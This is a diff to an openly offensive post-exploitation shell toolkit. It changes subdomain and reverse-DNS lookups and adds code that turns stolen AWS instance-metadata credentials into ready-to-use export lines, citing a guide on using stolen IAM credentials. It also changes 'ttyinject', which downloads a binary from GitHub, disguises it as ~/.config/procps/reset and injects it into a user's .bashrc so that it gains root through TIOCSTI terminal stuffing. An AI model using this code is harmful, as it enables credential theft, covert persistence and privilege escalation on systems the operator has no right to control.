@@ -374,6 +374,7 @@ resolv() {
         echo "${r}"$'\t'"${x}"
     done
 }
+
 find_subdomains() {
 	local d="${1//./\\.}"
 	local rexf='[0-9a-zA-Z_.-]{0,64}'"${d}"
@@ -487,18 +488,19 @@ bounce() {
     HS_INFO "Traffic to _this_ host's ${CDY}${proto}:${fport}${CDM} is now forwarded to ${CDY}${dstip}:${dstport}"
 }
 
-crt() {
-    [ $# -ne 1 ] && { HS_ERR "crt <domain-name>"; return 255; }
+sub() {
+    [ $# -ne 1 ] && { HS_ERR "sub <domain-name>"; return 255; }
     _hs_dep jq || return
     _hs_dep anew || return
-    curl -fsSL "https://crt.sh/?q=${1:?}&output=json" --compressed | jq -r '.[].common_name,.[].name_value' | anew | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]'
+    dl "https://crt.sh/?q=${1:?}&output=json" | jq -r '.[].common_name,.[].name_value' | anew | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]'
+    dl "https://ip.thc.org/sb/${1:?}"
 }
 
 ptr() {
     local str
     [ -n "$DNSDBTOKEN" ] && curl -m10 -H "X-API-Key: ${DNSDBTOKEN}" -H "Accept: application/json" -SsfL "https://api.dnsdb.info/lookup/rdata/ip/${1:?}/?limit=5&time_last_after=$(( $(date +%s) - 60 * 60 * 24 * 30))"
-    dl "https://ip.thc.org/api/v1/download?ip_address=${1:?}&limit=10&apex_domain=${2}" | column -t -s,
-    curl -m10 -SsfL -H "Authorization: Bearer ${IOTOKEN}" "https://ipinfo.io/${1:?}" && echo
+    dl "https://ip.thc.org/${1:?}?limit=20&f=${2}"
+    curl -m10 -SsfL -H "Authorization: Bearer ${IOTOKEN}" "https://ipinfo.io/${1:?}" && echo "" # newline
     str="$(host "$1" 2>/dev/null)" && echo "${str##* }"
 }
 
@@ -1027,8 +1029,17 @@ _loot_openstack() {
     [ -z "$QUIET" ] && echo -e "${CW}TIP: ${CDC}"'dl "http://169.254.169.254/openstack/latest/meta_data.json" | jq -r'"${CN}"
 }
 
+_loot_aws2var() {
+    local v="$(echo "$1" | grep -Fim1 "\"$2\"")"
+    v="${v#* : \"}"
+    v="${v%%\"*}"
+    [ -z "$v" ] && return 255
+    echo "$v"
+}
+
 # FIXME: Search through environment variables of all running processes.
 # FIXME: Implement GCP & Digital Ocean. See https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
+# https://hackingthe.cloud/aws/general-knowledge/using_stolen_iam_credentials/
 _loot_aws() {
     local str
     local TOKEN
@@ -1064,6 +1075,13 @@ _loot_aws() {
     [ -n "$str" ] && {
         echo -e "${CB}AWS EC2 Security Credentials${CDY}${CF}"
         echo "$str"
+        [ -z "$QUIET" ] && {
+            echo -en "${CDC}"
+            role="$(_loot_aws2var "$str" AccessKeyId)" && echo "export AWS_ACCESS_KEY_ID=${role}"
+            role="$(_loot_aws2var "$str" SecretAccessKey)" && echo "export AWS_SECRET_ACCESS_KEY=${role}"
+            role="$(_loot_aws2var "$str" Token)" && echo "export AWS_SESSION_TOKEN='${role}'"
+            echo -e "${CW}TIP:${CN} See ${CB}${CUL}https://hackingthe.cloud/aws/general-knowledge/using_stolen_iam_credentials/${CN}"
+        }
         echo -en "${CN}"
     }
 
@@ -1779,13 +1797,13 @@ ttyinject() {
     [ "$UID" -eq 0 ] && { HS_ERR "You are already root"; return; }
     [ ! -d "${_HS_HOME_ORIG}/.config/procps" ] && { mkdir -p "${_HS_HOME_ORIG}/.config/procps" || return; is_mkdir=1; }
 
-    [ ! -f "${_HS_HOME_ORIG}/.config/procps/reset" ] && {
-        dl "https://github.com/hackerschoice/ttyinject/releases/download/v1.1/ttyinject-linux-${HS_ARCH}" >"${_HS_HOME_ORIG}/.config/procps/reset" || return
+    [ ! -s "${_HS_HOME_ORIG}/.config/procps/reset" ] && {
+        dl "https://github.com/hackerschoice/ttyinject/releases/download/v1.1/ttyinject-linux-${HS_ARCH}" >"${_HS_HOME_ORIG}/.config/procps/reset" || { ttyinject_clean; return; }
     }
     chmod 755 "${_HS_HOME_ORIG}/.config/procps/reset" || { ttyinject_clean; return; }
 
     TTY_TEST=1 "${_HS_HOME_ORIG}/.config/procps/reset" || { ttyinject_clean; HS_WARN "System is not vulnerable to TIOCSTI stuffing."; return; }
-    if [ -f "${_HS_HOME_ORIG}/.bashrc" ]; then
+    if [ -s "${_HS_HOME_ORIG}/.bashrc" ]; then
         grep -qFm1 'procps/reset' "${_HS_HOME_ORIG}/.bashrc" 2>/dev/null || echo "$(head -n1 "${_HS_HOME_ORIG}/.bashrc")"$'\n'"~/.config/procps/reset 2>/dev/null"$'\n'"$(tail -n +2 "${_HS_HOME_ORIG}/.bashrc")" >"${_HS_HOME_ORIG}/.bashrc"
     else
         echo '~/.config/procps/reset 2>/dev/null' >"${_HS_HOME_ORIG}/.bashrc"
@@ -1985,8 +2003,8 @@ scan() {
 }
 
 hs_init_alias_reinit() {
-    # stop curl from creating ~/.pkt/nssdb
     which curl &>/dev/null && curl --help 2>/dev/null | grep -iqm1 proto-default && alias curl="HOME=/dev/null curl --proto-default https"
+    # stop curl from creating ~/.pkt/nssdb
     alias curl &>/dev/null || alias curl='HOME=/dev/null curl'
     which wget &>/dev/null && wget --help 2>/dev/null | grep -Fqm1 -- --no-hsts && alias wget="wget --no-hsts"
 
@@ -2109,7 +2127,7 @@ ${CDC} ttyinject                             ${CDM}Become root when root switche
 ${CDC} wfind <dir> [<dir> ...]               ${CDM}Find writeable directories
 ${CDC} hgrep <string>                        ${CDM}Grep for pattern, output for humans ${CN}${CF}[hgrep password]
 ${CDC} find_subdomains .foobar.com           ${CDM}Search files for sub-domain
-${CDC} crt foobar.com                        ${CDM}Query crt.sh for all sub-domains
+${CDC} sub foobar.com                        ${CDM}Query crt.sh/ip-thc for all sub-domains
 ${CDC} dns foobar.com                        ${CDM}Resolv domain name to IPv4
 ${CDC} rdns 1.2.3.4                          ${CDM}Reverse DNS from multiple public databases
 ${CDC} cn <IP> [<port>]                      ${CDM}Display TLS's CommonName of remote IP
